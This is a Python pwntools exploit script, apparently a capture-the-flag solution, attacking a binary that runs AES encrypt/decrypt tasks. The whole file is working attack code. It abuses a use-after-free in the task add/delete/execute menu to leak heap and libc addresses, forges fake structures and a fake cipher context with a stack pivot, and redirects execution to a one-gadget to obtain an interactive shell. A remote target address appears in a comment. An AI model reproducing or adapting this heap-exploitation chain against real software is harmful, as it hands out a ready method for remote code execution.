from pwn import *
from Crypto.Cipher import AES

def get_prompt():
	return p.recvuntil("Choice: ")

def decrypt_cbc(ct, key, iv):
	cipher = AES.new(key,AES.MODE_CBC,iv)
	pt = cipher.decrypt(ct)
	return pt

def encrypt_cbc(pt, key, iv):
	cipher = AES.new(key,AES.MODE_CBC,iv)
	ct = cipher.encrypt(pt)
	return ct


def add_task(taskid, mode, key, iv, plaintext_len, plaintext,give_plaintext=True):
	p.sendline("1")
	p.recvuntil("Task id : ")
	p.sendline(str(taskid))
	p.recvuntil("Encrypt(1) / Decrypt(2): ")
	p.sendline(str(mode))
	p.recvuntil("Key : ")
	p.send(key.ljust(0x20,"\x00"))
	p.recvuntil("IV : ")
	p.send(iv.ljust(0x10,"\x00"))
	p.recvuntil("Data Size : ")
	p.sendline(str(plaintext_len))
	p.recvuntil("Data : ")
	if give_plaintext:
		p.send(plaintext)
		get_prompt()
	else:
		return
	

def delete_task(taskid):
	p.sendline("2")
	p.recvuntil("Task id : ")
	p.sendline(str(taskid))
	get_prompt()

def go(taskid):
	p.sendline("3")
	p.recvuntil("Task id : ")
	p.sendline(str(taskid))

if __name__ == "__main__":
	context.log_level = 'debug'
	cmdline="./ld-2.27.so ./attackme"
	libc = ELF("./libs/libc.so.6")
	p = process(cmdline.split(" "),env={"LD_LIBRARY_PATH":"./libs"})
	#p = remote("111.186.63.201", 10001)
	# leaking phase
	add_task(0x20,1,"A"*0x20,"B"*0x10,0x20,"\x03"*0x20)
	add_task(0x21,1,"A"*0x20,"B"*0x10,0x20,"\x01"*0x20)

	delete_task(0x21)
	go(0x20)

	delete_task(0x20)
	add_task(0x20,1,"A"*0x20,"B"*0x10,0x70,"\x04"*0x70,give_plaintext=False)

	p.recvuntil("Ciphertext: \n")
	log.success("got leak ciphertext")
	data = ""
	for i in range(8):
		data += p.recvline().strip()+" "
	
	data = data.strip()
	data = data.split(" ")
	data = [chr(int(x,16)) for x in data]
	ct = "".join(data)
	x = decrypt_cbc(ct,"A"*0x20,"B"*0x10)
	ptr1 = u64(x[0x58:0x60])
	ptr2 = u64(x[0x68:0x70])
	log.info("leak1: 0x%x, leak2: 0x%x"%(ptr1,ptr2))
	p.send("A"*0x70)
	
	# create an unsorted bin for libc leak
	for i in range(9):
		add_task(0x3000+i,1,"A"*0x20,"B"*0x10,0x400,"\xdd"*0x400)

	for i in range(8):
		delete_task(0x3000+i)

	vulnerable_addr = 0x7f67b4f63420 - 0x7f67b4f60570 + ptr1 + 0x70

	# fake structure phase
	
	add_task(0,1,"A"*0x20,"B"*0x10,0x70,"\xcc"*0x70)
	add_task(1,1,"A"*0x20,"B"*0x10,0x70,"\xdd"*0x70)
	add_task(2,1,"A"*0x20,"B"*0x10,0x70,"\xee"*0x70)

	go(2)

	delete_task(2)
	delete_task(1)

	add_task(3,1,"A"*0x20,"B"*0x10,0x20,"\x01"*0x20)
	FAKESTRUCT = p64(vulnerable_addr)+p64(0x20)
	add_task(4,1,"A"*0x20,"B"*0x10,0x70,FAKESTRUCT,give_plaintext=False)
	p.send(FAKESTRUCT)

	p.recvuntil("Ciphertext: \n")
	data = ""
	for i in range(3):
		data += p.recvline().strip()+" "
	
	data = data.strip()
	data = data.split(" ")
	data = [chr(int(x,16)) for x in data]
	ct = "".join(data)
	x = decrypt_cbc(ct,"A"*0x20,"B"*0x10)
	LIBC = u64(x[:8]) + 0x7fa1908f8000 - 0x7fa190ce3ca0
	log.info("LIBC: 0x%x"%LIBC)

	system = LIBC + libc.symbols['system']
	p.send("A"*0x60)
	# heap overflow

	pivot = LIBC + 0x000000000002c9c3
	oneshot = LIBC + 0x4f322

	fake_ctx_addr = ptr1 + 0x7f79f8de5880 - 0x7f79f8de5570
	FAKE_CTX = p64(fake_ctx_addr)  +"\xFF"*0x18
	FAKE_CTX += p64(pivot)
	FAKE_CTX = FAKE_CTX.ljust(0x70,"\xFF")

	add_task(0x3330,1,"A"*0x20,"B"*0x10,0x70,FAKE_CTX)
	add_task(0x3331,1,"A"*0x20,"B"*0x10,0x70,"\xdd"*0x70)
	add_task(0x3332,1,"A"*0x20,"B"*0x10,0x70,"\xee"*0x70)


	go(0x3332)

	delete_task(0x3332)
	delete_task(0x3331)

	add_task(0x3333,1,"A"*0x20,"B"*0x10,0x20,"\x01"*0x20)
	
	FAKESTRUCT = p64(oneshot) + p64(0xdeadbeef) + "\x00"*0x48
	FAKESTRUCT += p64(fake_ctx_addr)
	FAKESTRUCT = FAKESTRUCT.ljust(0x70,"\x00")
	
	add_task(0x3334,1,"A"*0x20,"B"*0x10,0x70,FAKESTRUCT)
	#gdb.attach(p,gdbscript="b *EVP_CipherUpdate")
	p.interactive()